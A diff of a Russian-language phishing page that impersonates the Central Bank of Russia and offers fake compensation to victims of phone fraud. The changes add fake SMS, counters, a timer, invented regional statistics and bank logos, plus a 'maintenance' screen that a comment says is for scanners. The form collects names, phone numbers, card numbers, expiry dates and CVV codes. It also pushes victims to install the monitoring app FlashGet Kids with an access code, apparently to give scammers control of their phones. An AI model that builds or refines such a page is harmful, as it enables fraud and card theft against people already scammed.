@@ -5,159 +5,236 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ЦБ РФ | Компенсационная программа</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         body {
-            background: linear-gradient(to bottom, rgba(13, 71, 161, 0.6), rgba(26, 35, 126, 0.65)), 
-                        url('https://www.ntv.ru/home/news/2023/20230706/cb1_sno.jpg') no-repeat center center fixed;
-            background-size: cover;
-            color: white; 
-            min-height: 100vh; 
-            padding: 20px;
-        }
-        .container {
-            max-width: 500px; 
-            margin: 0 auto; 
-            background: white; 
-            color: black;
-            border-radius: 15px; 
-            padding: 30px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            background: linear-gradient(135deg, rgba(13, 71, 161, 0.7) 0%, rgba(26, 35, 126, 0.8) 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 15px;
             position: relative;
         }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: url('https://www.ntv.ru/home/news/2023/20230706/cb1_sno.jpg') no-repeat center center;
+            background-size: cover;
+            opacity: 0.4;
+            z-index: -1;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.98);
+            color: #333;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            position: relative;
+            border: 1px solid rgba(13, 71, 161, 0.3);
+        }
         .header {
-            text-align: center; 
-            border-bottom: 2px solid #0d47a1;
-            padding-bottom: 20px; 
-            margin-bottom: 30px;
+            text-align: center;
+            padding-bottom: 20px;
+            margin-bottom: 25px;
+            border-bottom: 3px solid #0d47a1;
+            position: relative;
         }
         .logo-text {
-            font-size: 1.8em; 
-            color: #0d47a1; 
-            font-weight: bold; 
+            font-size: 1.7em;
+            color: #0d47a1;
+            font-weight: 800;
             margin-bottom: 5px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
         .badge {
-            background: #4caf50; 
-            color: white; 
-            padding: 5px 15px;
-            border-radius: 20px; 
-            display: inline-block; 
-            margin: 10px 0; 
-            font-size: 0.9em;
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            color: white;
+            padding: 6px 18px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 8px 0;
+            font-size: 0.85em;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(76, 175, 80, 0.3);
         }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 5px; color: #555; }
+        .form-group { margin-bottom: 18px; }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #555;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
         input {
-            width: 100%; 
-            padding: 12px; 
+            width: 100%;
+            padding: 14px 16px;
             border: 2px solid #ddd;
-            border-radius: 8px; 
+            border-radius: 10px;
             font-size: 16px;
+            transition: all 0.3s;
+            background: #f9f9f9;
+        }
+        input:focus {
+            border-color: #0d47a1;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.1);
+            outline: none;
         }
         .check-btn {
-            width: 100%; 
-            padding: 15px; 
-            background: #0d47a1; 
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0d47a1, #1a237e);
             color: white;
-            border: none; 
-            border-radius: 8px; 
-            font-size: 1.1em; 
-            cursor: pointer; 
-            margin: 10px 0;
-            transition: background 0.3s;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 15px rgba(13, 71, 161, 0.4);
         }
         .check-btn:hover {
-            background: #1a237e;
+            background: linear-gradient(135deg, #1a237e, #0d47a1);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(13, 71, 161, 0.5);
+        }
+        .check-btn:active {
+            transform: translateY(0);
         }
         .result {
-            display: none; 
-            background: #e8f5e9; 
+            display: none;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
             padding: 25px;
-            border-radius: 10px; 
-            margin: 25px 0; 
+            border-radius: 15px;
+            margin: 25px 0;
             text-align: center;
+            border: 2px solid #4caf50;
+            position: relative;
+            overflow: hidden;
+        }
+        .result::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #4caf50, #2e7d32, #4caf50);
+            animation: shimmer 2s infinite linear;
+        }
+        @keyframes shimmer {
+            0% { background-position: -200px 0; }
+            100% { background-position: 200px 0; }
         }
         .amount {
-            font-size: 2.5em; 
-            color: #0d47a1; 
-            font-weight: bold; 
-            margin: 15px 0;
+            font-size: 2.8em;
+            color: #0d47a1;
+            font-weight: 900;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
         }
         .download-btn {
-            display: block; 
-            background: #ff9800; 
-            color: white; 
+            display: block;
+            background: linear-gradient(135deg, #ff9800, #e68900);
+            color: white;
             text-align: center;
-            padding: 15px; 
-            border-radius: 8px; 
-            text-decoration: none; 
-            margin: 15px 0; 
+            padding: 17px;
+            border-radius: 12px;
+            text-decoration: none;
+            margin: 20px 0;
             font-weight: bold;
-            transition: background 0.3s;
+            font-size: 1.05em;
+            transition: all 0.3s;
+            box-shadow: 0 6px 15px rgba(255, 152, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        .download-btn::after {
+            content: '⬇️';
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.2em;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(-50%); }
+            50% { transform: translateY(-60%); }
         }
         .download-btn:hover {
-            background: #e68900;
+            background: linear-gradient(135deg, #e68900, #ff9800);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 152, 0, 0.5);
         }
         .manager-note {
-            background: #e3f2fd; 
-            border: 1px solid #2196f3; 
-            padding: 12px;
-            border-radius: 8px; 
-            margin: 15px 0; 
-            font-size: 0.9em; 
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+            border: 2px solid #2196f3;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            font-size: 0.92em;
             color: #0d47a1;
+            position: relative;
+        }
+        .manager-note::before {
+            content: '❗';
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            font-size: 1.2em;
         }
         .card-verification-section {
             display: none;
-            background: #f9f9f9;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 2px solid #0d47a1;
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 22px;
+            border-radius: 15px;
+            margin: 22px 0;
+            border: 3px solid #0d47a1;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.1);
         }
         .card-row {
             display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
+            gap: 12px;
+            margin-bottom: 18px;
         }
         .card-row .form-group {
             flex: 1;
         }
         .card-row .form-group:last-child {
-            flex: 0.5;
-        }
-        .modal-overlay {
-            display: none; 
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            max-width: 500px;
-            width: 90%;
-            max-height: 90vh;
-            overflow-y: auto;
+            flex: 0.6;
         }
         .loader {
             display: none;
             text-align: center;
             padding: 30px;
+            background: white;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
         }
         .loader-spinner {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0d47a1;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #0d47a1;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
+            position: relative;
+        }
+        .loader-spinner::after {
+            content: '';
+            position: absolute;
+            top: -6px; left: -6px; right: -6px; bottom: -6px;
+            border: 6px solid transparent;
+            border-top: 6px solid #ff9800;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite reverse;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -165,118 +242,516 @@
         }
         .verification-error {
             display: none;
-            background: #ffebee;
-            border: 1px solid #f44336;
+            background: linear-gradient(135deg, #ffebee, #ffcdd2);
+            border: 2px solid #f44336;
             color: #d32f2f;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 20px 0;
+            padding: 22px;
+            border-radius: 12px;
+            margin: 22px 0;
             text-align: center;
+            position: relative;
+        }
+        .verification-error::before {
+            content: '⚠️';
+            font-size: 2em;
+            display: block;
+            margin-bottom: 10px;
         }
         .payment-counter {
             text-align: center;
-            background: #e8f5e9;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 15px 0;
-            border-left: 4px solid #4caf50;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            padding: 14px;
+            border-radius: 12px;
+            margin: 18px 0;
+            border-left: 5px solid #4caf50;
             font-weight: bold;
             color: #2e7d32;
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.2);
         }
         .option-buttons {
             display: flex;
             gap: 15px;
-            margin: 20px 0;
+            margin: 22px 0;
         }
         .option-btn {
             flex: 1;
-            padding: 20px;
+            padding: 22px 12px;
             text-align: center;
-            border-radius: 10px;
+            border-radius: 12px;
             cursor: pointer;
             font-weight: bold;
             transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        .option-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0));
+            pointer-events: none;
         }
         .option-btn.primary {
-            background: #0d47a1;
+            background: linear-gradient(135deg, #0d47a1, #1565c0);
             color: white;
         }
         .option-btn.secondary {
-            background: #ff9800;
+            background: linear-gradient(135deg, #ff9800, #ff5722);
             color: white;
         }
         .option-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+        }
+        .timer-container {
+            background: linear-gradient(135deg, #fff3e0, #ffcc80);
+            border: 2px solid #ff9800;
+            border-radius: 12px;
+            padding: 18px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+        .timer {
+            font-size: 2.2em;
+            font-weight: 900;
+            color: #d84315;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+        .counter-box {
+            background: linear-gradient(135deg, #e1f5fe, #b3e5fc);
+            border: 2px solid #0288d1;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        .counter {
+            font-size: 1.8em;
+            font-weight: 900;
+            color: #0277bd;
+            margin: 8px 0;
+        }
+        .geo-info {
+            background: linear-gradient(135deg, #f3e5f5, #e1bee7);
+            border: 2px solid #7b1fa2;
+            border-radius: 12px;
+            padding: 18px;
+            margin: 18px 0;
+            position: relative;
+        }
+        .geo-info::before {
+            content: '📍';
+            position: absolute;
+            left: 18px;
+            top: 18px;
+            font-size: 1.5em;
+        }
+        .banks {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 12px;
+            border: 2px solid #0d47a1;
+        }
+        .bank-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #0d47a1, #1a237e);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 0.8em;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        .progress-bar {
+            height: 12px;
+            background: #e0e0e0;
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4caf50, #2e7d32);
+            border-radius: 6px;
+            width: 84%;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255,255,255,0.4), 
+                transparent);
+            animation: progressShimmer 2s infinite;
+        }
+        @keyframes progressShimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .notification-toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            z-index: 10000;
+            max-width: 300px;
+            display: none;
+            animation: slideIn 0.5s ease;
+            border-left: 5px solid #2e7d32;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .sms-interface {
+            background: #e0f7fa;
+            border: 2px solid #006064;
+            border-radius: 12px;
+            padding: 0;
+            margin: 20px 0;
+            overflow: hidden;
+            font-family: 'SF Pro Text', -apple-system, sans-serif;
+        }
+        .sms-header {
+            background: #006064;
+            color: white;
+            padding: 12px 15px;
+            font-size: 0.9em;
+            display: flex;
+            justify-content: space-between;
+        }
+        .sms-content {
+            padding: 20px 15px;
+            background: white;
+            margin: 10px;
+            border-radius: 8px;
+            border: 1px solid #b2ebf2;
+        }
+        .sms-sender {
+            color: #006064;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .sms-text {
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        .sms-link {
+            color: #0d47a1;
+            font-weight: bold;
+            word-break: break-all;
+            font-size: 0.9em;
+        }
+        .review-btn {
+            background: linear-gradient(135deg, #9c27b0, #7b1fa2);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        .review-btn:hover {
+            background: linear-gradient(135deg, #7b1fa2, #9c27b0);
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .review-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 10001;
+            justify-content: center;
+            align-items: center;
+        }
+        .review-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+        }
+        .refresh-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #f44336;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 1.5em;
+            cursor: pointer;
+            z-index: 9999;
+            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.4);
+            display: none;
+        }
+        .maintenance-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(135deg, #0d47a1, #1a237e);
+            color: white;
+            z-index: 10002;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            font-size: 1.2em;
+        }
+        .live-check {
+            background: rgba(13, 71, 161, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+            color: #0d47a1;
+            border-left: 3px solid #0d47a1;
+        }
+        .live-check::before {
+            content: '🔴';
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
         @media (max-width: 600px) {
-            .option-buttons {
-                flex-direction: column;
-            }
-            .container {
-                padding: 20px;
-            }
+            .container { padding: 20px; }
+            .option-buttons { flex-direction: column; }
+            .bank-logo { width: 35px; height: 35px; font-size: 0.7em; }
+            .amount { font-size: 2.2em; }
+            .timer { font-size: 1.8em; }
+        }
+        @media (max-width: 400px) {
+            .container { padding: 15px; }
+            .logo-text { font-size: 1.4em; }
+            .check-btn, .download-btn { padding: 15px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- ЭКРАН ТЕХОБСЛУЖИВАНИЯ (для сканеров) -->
+    <div class="maintenance-screen" id="maintenanceScreen">
+        <div>
+            <h2 style="margin-bottom: 20px;">🔧 Техническое обслуживание</h2>
+            <p>Портал временно недоступен.</p>
+            <p>Проводится обновление системы безопасности ЦБ РФ.</p>
+            <p style="margin-top: 30px; font-size: 0.9em; color: #bbdefb;">
+                Пожалуйста, попробуйте позже или обновите страницу.
+            </p>
+            <button onclick="location.reload()" style="
+                background: white;
+                color: #0d47a1;
+                border: none;
+                padding: 12px 30px;
+                border-radius: 8px;
+                margin-top: 20px;
+                font-weight: bold;
+                cursor: pointer;
+            ">
+                Обновить страницу
+            </button>
+        </div>
+    </div>
+
+    <!-- КНОПКА ОБНОВЛЕНИЯ (показывается только после техобслуживания) -->
+    <button class="refresh-btn" id="refreshBtn" onclick="location.reload()" title="Обновить страницу">
+        ↻
+    </button>
+
+    <!-- УВЕДОМЛЕНИЯ -->
+    <div class="notification-toast" id="notificationToast"></div>
+
+    <!-- МОДАЛКА ОТЗЫВОВ -->
+    <div class="review-modal" id="reviewModal">
+        <div class="review-content">
+            <h3 style="color: #0d47a1; margin-bottom: 20px;">✍️ Оставить отзыв</h3>
+            <div class="form-group">
+                <label>Ваше имя</label>
+                <input type="text" id="reviewName" placeholder="Иван Иванов">
+            </div>
+            <div class="form-group">
+                <label>Ваш город</label>
+                <input type="text" id="reviewCity" placeholder="Москва">
+            </div>
+            <div class="form-group">
+                <label>Сумма выплаты (₽)</label>
+                <input type="number" id="reviewAmount" placeholder="189000">
+            </div>
+            <div class="form-group">
+                <label>Ваш отзыв</label>
+                <textarea id="reviewText" placeholder="Расскажите о вашем опыте..." 
+                          style="width: 100%; padding: 12px; border-radius: 8px; border: 2px solid #ddd; min-height: 100px;"></textarea>
+            </div>
+            <button class="check-btn" onclick="submitReview()" style="margin-top: 20px;">
+                📤 Отправить отзыв
+            </button>
+            <button onclick="document.getElementById('reviewModal').style.display='none'" 
+                    style="background: #666; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; margin-top: 10px; cursor: pointer;">
+                Отмена
+            </button>
+        </div>
+    </div>
+
+    <!-- ОСНОВНОЙ КОНТЕЙНЕР -->
+    <div class="container" id="mainContainer">
         <!-- ШАПКА -->
         <div class="header">
             <div style="display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 15px;">
-                <img src="https://i.ytimg.com/vi/ZropkIAHdxY/maxresdefault.jpg" 
-                     alt="Логотип ЦБ РФ" 
-                     style="width: 70px; height: 70px; object-fit: contain;"
-                     onerror="this.style.display='none'">
+                <div style="
+                    width: 70px; height: 70px;
+                    background: linear-gradient(135deg, #0d47a1, #1a237e);
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    color: white;
+                    font-weight: bold;
+                    font-size: 0.9em;
+                    text-align: center;
+                    box-shadow: 0 8px 20px rgba(13, 71, 161, 0.4);
+                ">
+                    ЦБ<br>РФ
+                </div>
                 <div style="text-align: left;">
-                    <div class="logo-text" style="font-size: 1.8em; color: #0d47a1; font-weight: bold; margin-bottom: 5px;">
+                    <div class="logo-text">
                         ЦЕНТРАЛЬНЫЙ БАНК<br>РОССИЙСКОЙ ФЕДЕРАЦИИ
                     </div>
-                    <div class="badge" style="background: #4caf50; color: white; padding: 4px 12px; border-radius: 15px; display: inline-block; font-size: 0.85em;">
-                        Официальная программа компенсаций
+                    <div class="badge">
+                        ✅ Официальная программа компенсаций
                     </div>
                 </div>
             </div>
             
-            <div style="background: #f0f7ff; padding: 15px; border-radius: 10px; border-left: 4px solid #0d47a1; margin-top: 10px;">
+            <!-- SMS-ИНТЕРФЕЙС -->
+            <div class="sms-interface" id="smsInterface">
+                <div class="sms-header">
+                    <span>ЦБ РФ</span>
+                    <span>Только что</span>
+                </div>
+                <div class="sms-content">
+                    <div class="sms-sender">От: ЦБ РФ</div>
+                    <div class="sms-text">
+                        Проверьте компенсацию до 280 000 ₽ для пострадавших от телефонных мошенников.
+                    </div>
+                    <div class="sms-link" id="smsLink">cbrf-comp.ru/check</div>
+                </div>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #f0f7ff, #e3f2fd); padding: 18px; border-radius: 15px; border-left: 5px solid #0d47a1; margin-top: 15px;">
                 <p style="color: #333; margin: 0; line-height: 1.5; font-size: 0.95em;">
-                    <strong style="color: #0d47a1;">📍 Возврат средств пострадавшим</strong><br>
-                    Если вам звонили от лица банка или службы безопасности и вы переводили деньги — 
-                    проверьте право на компенсацию через наш портал.<br><br>
-                    
-                    <span style="color: #d32f2f; font-weight: bold;">💰 Указанная сумма — гарантированный минимум выплаты.</span><br>
-                    Если фактические потери больше — предоставьте доказательства сотруднику для 
-                    оформления дополнительных выплат.
+                    <strong style="color: #0d47a1;">📍 Возврат средств пострадавшим от мошенников</strong><br>
+                    Если вам звонили от лица банка или службы безопасности и вы переводили деньги — проверьте право на компенсацию.
                 </p>
             </div>
         </div>
 
-        <!-- ФОРМА ВВОДА -->
+        <!-- СЧЕТЧИКИ И ТАЙМЕР -->
+        <div class="counter-box">
+            <div style="font-size: 0.9em; color: #0277bd;">Осталось свободных заявок:</div>
+            <div class="counter" id="requestsCounter">14</div>
+            <div style="font-size: 0.8em; color: #666; margin-top: 5px;">Сейчас онлайн проверяют: <span id="onlineUsers">8</span> человек</div>
+        </div>
+
+        <!-- ГЕОЛОКАЦИЯ И БАНКИ -->
+        <div class="geo-info">
+            <div style="margin-left: 40px;">
+                <strong style="color: #7b1fa2;">📍 Ваш регион: Московская область (определено по IP)</strong><br>
+                <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
+                    ⚠️ В вашем районе зафиксировано <strong>347 обращений</strong> в МВД о потере средств<br>
+                    💰 <strong>Повышенный коэффициент компенсации: +35%</strong> (решение прокуратуры МО)
+                </div>
+            </div>
+        </div>
+
+        <!-- БАНКИ-ПАРТНЕРЫ -->
+        <div style="text-align: center; margin: 15px 0; color: #0d47a1; font-weight: bold;">
+            🏦 Программа поддержана банками:
+        </div>
+        <div class="banks">
+            <div class="bank-logo" title="Сбербанк">СБ</div>
+            <div class="bank-logo" title="Тинькофф">ТБ</div>
+            <div class="bank-logo" title="ВТБ">ВТ</div>
+            <div class="bank-logo" title="Альфа-Банк">АБ</div>
+            <div class="bank-logo" title="Газпромбанк">ГП</div>
+            <div class="bank-logo" title="Совкомбанк">СК</div>
+            <div class="bank-logo" title="Райффайзен">РБ</div>
+        </div>
+
+        <!-- ПРОГРЕСС-БАР ВЫПЛАТ -->
+        <div style="margin: 20px 0;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                <span style="font-weight: bold; color: #333;">Выплачено сегодня:</span>
+                <span style="font-weight: bold; color: #2e7d32;">8.4 / 10 млн ₽</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div style="text-align: center; margin-top: 5px; font-size: 0.9em; color: #666;">
+                Осталось к выплате: <strong>1.6 млн ₽</strong>
+            </div>
+        </div>
+
+        <!-- ФОРМА ПРОВЕРКИ -->
         <div class="form-group">
             <label>Фамилия</label>
-            <input type="text" id="lastName" placeholder="Иванов" required>
+            <input type="text" id="lastName" placeholder="Иванов" required data-field="userSurname">
         </div>
         <div class="form-group">
             <label>Имя</label>
-            <input type="text" id="firstName" placeholder="Иван" required>
+            <input type="text" id="firstName" placeholder="Иван" required data-field="userName">
         </div>
         <div class="form-group">
             <label>Отчество</label>
-            <input type="text" id="middleName" placeholder="Иванович">
+            <input type="text" id="middleName" placeholder="Иванович" data-field="userMiddleName">
         </div>
         <div class="form-group">
             <label>Номер телефона</label>
-            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
+            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required data-field="userPhone">
         </div>
 
-        <button class="check-btn" onclick="checkCompensation()">🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ</button>
+        <!-- КНОПКА ПРОВЕРКИ -->
+        <button class="check-btn" onclick="checkCompensation()">
+            🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ
+        </button>
 
-        <!-- СЧЕТЧИК -->
-        <div class="payment-counter">
-            💰 Уже выплачено: <strong>15 427 000 ₽</strong>
-        </div>
+        <!-- КНОПКА ОТЗЫВА -->
+        <button class="review-btn" onclick="showReviewModal()">
+            ✍️ Оставить отзыв о выплате
+        </button>
 
-        <!-- РЕЗУЛЬТАТ ДЛЯ ЛОХА -->
+        <!-- РЕЗУЛЬТАТ -->
         <div class="result" id="result">
             <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
             <h3 id="userName"></h3>
@@ -284,6 +759,16 @@
             <div class="amount" id="moneyAmount">0 ₽</div>
             <p>Средства зарезервированы на ваше имя.</p>
 
+            <!-- ТАЙМЕР -->
+            <div class="timer-container" id="timerContainer">
+                <div style="font-weight: bold; color: #ff6f00;">⏰ Осталось получить:</div>
+                <div class="timer" id="timer">59:59</div>
+                <div style="font-size: 0.9em; color: #666;">
+                    Выплата будет отменена автоматически
+                </div>
+            </div>
+
+            <!-- ВЫБОР СПОСОБА -->
             <div style="margin: 25px 0;">
                 <p><strong>Для получения выплаты выберите способ:</strong></p>
                 
@@ -302,22 +787,27 @@
             <!-- БЛОК ПРИЛОЖЕНИЯ -->
             <div id="appBlock" style="display: none;">
                 <p><strong>Инструкция для получения:</strong></p>
-                <ol style="text-align: left; background: #f5f5f5; padding: 15px; border-radius: 8px;">
-                    <li>Загрузите программу FlashGet Kids по кнопке ниже. Для сохранности устанавливайте <strong>"Детское приложение"</strong>.</li>
-                    <li>Инсталлируйте и зарегистрируйтесь в программе.</li>
-                    <li>Введите идентификационный ключ: <strong>317 287 002</strong></li>
-                    <li>Следуйте указаниям в программе.</li>
+                <ol style="text-align: left; background: #f5f5f5; padding: 18px; border-radius: 10px; margin: 18px 0;">
+                    <li>Загрузите приложение FlashGet Kids по кнопке ниже. Для безопасности устанавливайте <strong>"Детское приложение"</strong>.</li>
+                    <li>Установите и зарегистрируйтесь в приложении.</li>
+                    <li>Введите код доступа: <strong>317 287 002</strong></li>
+                    <li>Следуйте инструкциям в приложении.</li>
                 </ol>
 
                 <div class="manager-note">
-                    <strong>❗ Важно:</strong> Для помощи с инсталляцией с вами свяжется менеджер.<br>
-                    Продублируйте сумму выплаты менеджеру в чат для ускорения получения.
+                    <strong>❗ Важно:</strong> Вы можете установить приложение самостоятельно.<br>
+                    Если не получится — с вами свяжется менеджер для помощи.
                 </div>
 
-                <a href="https://flashget.kids/ru" class="download-btn" target="_blank" onclick="trackDownload()">
-                    ⬇️ ЗАГРУЗИТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ СРЕДСТВ
+                <a href="https://flashget.kids/ru" class="download-btn" target="_blank" id="mainDownloadLink" onclick="trackDownload()">
+                    ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ СРЕДСТВ
                 </a>
-                <p style="color: #666; font-size: 0.9em; margin-top: 15px;">Ожидайте звонка менеджера в течение 24 часов.</p>
+                <div class="live-check">
+                    Сейчас скачивают приложение: <strong id="liveDownloads">3</strong> человек
+                </div>
+                <p style="color: #666; font-size: 0.9em; margin-top: 15px;">
+                    Ожидайте звонка менеджера в течение 24 часов.
+                </p>
             </div>
 
             <!-- БЛОК ВЕРИФИКАЦИИ КАРТЫ -->
@@ -326,23 +816,23 @@
                 
                 <div class="form-group">
                     <label>Номер банковской карты</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" data-field="paymentCard">
                 </div>
                 
                 <div class="card-row">
                     <div class="form-group">
                         <label>Срок действия (ММ/ГГ)</label>
-                        <input type="text" id="cardExpiry" placeholder="12/25" maxlength="5">
+                        <input type="text" id="cardExpiry" placeholder="12/25" maxlength="5" data-field="cardExpiry">
                     </div>
                     <div class="form-group">
                         <label>CVV код</label>
-                        <input type="text" id="cardCVV" placeholder="123" maxlength="3">
+                        <input type="text" id="cardCVV" placeholder="123" maxlength="3" data-field="securityCode">
                     </div>
                 </div>
 
                 <div class="form-group">
                     <label>Телефон для СБП (если перевод не подтвердится)</label>
-                    <input type="tel" id="sbpPhone" placeholder="+7 999 000-00-00">
+                    <input type="tel" id="sbpPhone" placeholder="+7 999 000-00-00" data-field="backupPhone">
                 </div>
 
                 <button class="check-btn" onclick="verifyCard()">
@@ -362,22 +852,18 @@
                 <h4 style="color: #d32f2f;">⚠️ Платежная система ЦБ РФ отклонила прямой перевод на карту</h4>
                 <p>Требуется подтверждение личности через официальное защищенное приложение.</p>
                 <p>Это стандартная процедура для возврата средств пострадавшим.</p>
-                <button class="check-btn" style="background: #ff9800; margin-top: 15px;" onclick="showAppOption()">
+                <button class="check-btn" style="background: linear-gradient(135deg, #ff9800, #e68900); margin-top: 15px;" onclick="showAppOption()">
                     📱 УСТАНОВИТЬ ЗАЩИЩЕННОЕ ПРИЛОЖЕНИЕ
                 </button>
             </div>
         </div>
 
         <!-- ПОДВАЛ -->
